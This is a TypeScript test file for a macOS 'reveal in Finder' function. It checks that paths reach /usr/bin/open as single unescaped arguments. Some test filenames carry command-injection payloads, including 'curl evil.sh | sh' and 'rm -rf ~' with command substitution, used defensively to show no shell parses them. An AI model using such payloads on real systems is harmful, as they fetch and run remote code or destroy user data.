import { describe, expect, it } from 'vitest'

import { REVEAL_TIMEOUT_MS, revealInFinder, type RevealSeam } from '../../src/server/reveal'
import { ErrorCode } from '../../src/core/errors'

/**
 * **WHAT IS HANDED TO THE OPERATING SYSTEM, ASSERTED ARGUMENT BY ARGUMENT.** Spec §10.
 *
 * `sanctioned-shell.test.ts` proves the *shape* of this module — that it calls `execFile`, states
 * `shell: false`, and builds no command line. These prove the *content*: what actually reaches the
 * binary when a file is revealed, including for the filenames this app has to survive.
 *
 * **The filenames below are the point.** Every one of them is a name an agent with write access to
 * the user's tree could create, and every one of them breaks a naive implementation. The reason none
 * of them needs escaping here is that nothing is escaped anywhere — `execFile` with an argument
 * array hands the kernel one opaque argument, so a filename cannot become a command. These cases
 * exist to prove that claim rather than to state it.
 */

/** Records the invocation instead of making one. */
function recordingSeam(outcome: { ok: true } | { ok: false; detail: string } = { ok: true }) {
  const calls: { binary: string; args: string[] }[] = []
  const seam: RevealSeam = {
    run: async (binary, args) => { calls.push({ binary, args: [...args] }); return outcome },
  }
  return { seam, calls }
}

describe('what reaches the binary', () => {
  it('is the absolute open binary, reveal, end-of-options, then the path — in that order', async () => {
    const { seam, calls } = recordingSeam()
    const result = await revealInFinder('/Users/p/soil/note.md', seam)

    expect(result.ok).toBe(true)
    expect(calls).toHaveLength(1)
    expect(calls[0]?.binary, 'a bare name would resolve through PATH').toBe('/usr/bin/open')
    expect(calls[0]?.args).toEqual(['-R', '--', '/Users/p/soil/note.md'])
  })

  it('reveals rather than opens, which is the difference from a cut feature', async () => {
    // Without `-R`, `open` hands the file to whatever application claims it — Open in Default App,
    // CUT from v1 on 2026-08-09. Two characters between the shipped feature and the removed one.
    const { seam, calls } = recordingSeam()
    await revealInFinder('/Users/p/soil/note.md', seam)
    expect(calls[0]?.args[0], 'the reveal flag is missing: this OPENS the file').toBe('-R')
  })

  it('passes a filename that would end a quoted argument, unescaped and intact', async () => {
    /**
     * **The attack §10 is written against**, as a filename rather than as prose.
     *
     * `exec("open \\"" + path + "\\"")` with this name closes the quote, runs `curl … | sh`, and
     * comments out the remainder. Here it arrives at the kernel as one argument, byte for byte,
     * because there is no shell to parse it — which is why it is asserted **unmodified**. A version
     * of this that sanitised the name would pass a weaker test and be a worse design.
     */
    const nasty = '/Users/p/soil/note"; curl evil.sh | sh; #.md'
    const { seam, calls } = recordingSeam()
    await revealInFinder(nasty, seam)
    expect(calls[0]?.args[2], 'the filename was altered on the way through').toBe(nasty)
    expect(calls[0]?.args).toHaveLength(3)
  })

  it('passes a filename made entirely of shell metacharacters', async () => {
    const nasty = '/Users/p/soil/$(whoami)`id`;rm -rf ~;.md'
    const { seam, calls } = recordingSeam()
    await revealInFinder(nasty, seam)
    expect(calls[0]?.args[2]).toBe(nasty)
  })

  it('passes a filename that begins with a dash without it becoming a flag', async () => {
    // This is what `--` is for. `open -R -n` would be an option; `open -R -- -n` is a path.
    const dashed = '/Users/p/soil/-n'
    const { seam, calls } = recordingSeam()
    await revealInFinder(dashed, seam)
    expect(calls[0]?.args[1], 'end-of-options marker missing').toBe('--')
    expect(calls[0]?.args[2]).toBe(dashed)
  })

  it('passes a newline in a filename intact, rather than splitting on it', async () => {
    const multiline = '/Users/p/soil/two\nlines.md'
    const { seam, calls } = recordingSeam()
    await revealInFinder(multiline, seam)
    expect(calls[0]?.args[2]).toBe(multiline)
    expect(calls[0]?.args).toHaveLength(3)
  })
})

describe('what it refuses, and how it fails', () => {
  it('refuses a relative path without invoking anything', async () => {
    // Not a security control — the containment walk is. A relative path would resolve against the
    // server's working directory, which is a wrong answer rather than a refusal.
    const { seam, calls } = recordingSeam()
    const result = await revealInFinder('soil/note.md', seam)

    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.code).toBe(ErrorCode.INVALID_ROOT)
    expect(calls, 'the binary was invoked despite the refusal').toHaveLength(0)
  })

  it('refuses an empty path without invoking anything', async () => {
    const { seam, calls } = recordingSeam()
    expect((await revealInFinder('', seam)).ok).toBe(false)
    expect(calls).toHaveLength(0)
  })

  it('reports a failed invocation as an IO failure rather than throwing', async () => {
    const { seam } = recordingSeam({ ok: false, detail: 'spawn ENOENT' })
    const result = await revealInFinder('/Users/p/soil/note.md', seam)
    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.code).toBe(ErrorCode.IO_FAILED)
  })

  it('bounds how long Finder gets', () => {
    // A local GUI call. Anything past this is a hang, and a hung reveal would hold a request open.
    expect(REVEAL_TIMEOUT_MS).toBeGreaterThan(0)
    expect(REVEAL_TIMEOUT_MS).toBeLessThanOrEqual(10_000)
  })
})
